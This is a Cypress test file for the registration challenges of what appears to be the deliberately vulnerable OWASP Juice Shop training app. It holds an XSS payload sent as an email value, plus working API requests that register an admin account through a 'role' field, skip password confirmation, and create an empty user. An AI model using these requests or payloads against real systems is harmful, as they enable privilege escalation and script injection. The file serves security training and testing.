describe('/#/register', () => {
  beforeEach(() => {
    cy.visit('/#/register')
  })

  describe('challenge "persistedXssUser"', () => {
    it('should recursively sanitize masked XSS sent directly to the REST API', () => {
      const safeEmail = `xss-regression-${Date.now()}@example.test`
      cy.request({
        method: 'POST',
        url: '/api/Users/',
        body: {
          email: `${safeEmail}<<script>Foo</script>iframe src="javascript:alert(\`xss\`)">`,
          password: 'XSSed',
          passwordRepeat: 'XSSed'
        }
      }).then((response) => {
        expect(response.status).to.equal(201)
        expect(response.body.data.email).to.equal(safeEmail)
      })
      cy.request('/api/Challenges/?name=Client-side XSS Protection').then((response) => {
        expect(response.body.data[0].solved).to.equal(false)
      })
    })
  })

  describe('challenge "registerAdmin"', () => {
    it('should be possible to register admin user using REST API', () => {
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/api/Users/`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/json'
          },
          body: JSON.stringify({
            email: 'testing@test.com',
            password: 'pwned',
            passwordRepeat: 'pwned',
            role: 'admin'
          })
        })
        if (response.status === 201) {
          console.log('Success')
        }
      })
      cy.expectChallengeSolved({ challenge: 'Admin Registration' })
    })
  })

  describe('challenge "passwordRepeat"', () => {
    it('should be possible to register user without repeating the password', () => {
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/api/Users/`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/json'
          },
          body: JSON.stringify({
            email: 'uncle@bob.com',
            password: 'ThereCanBeOnlyOne'
          })
        })
        if (response.status === 201) {
          console.log('Success')
        }
      })
      cy.expectChallengeSolved({ challenge: 'Repetitive Registration' })
    })
  })

  describe('challenge "registerEmptyUser"', () => {
    it('should be possible to register a user with blank email/password', () => {
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/api/Users`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/json'
          },
          body: JSON.stringify({
            email: '',
            password: '',
            passwordRepeat: ''
          })
        })
        if (response.status === 201) {
          console.log('Success')
        }
      })
      cy.expectChallengeSolved({ challenge: 'Empty User Registration' })
    })
  })
})
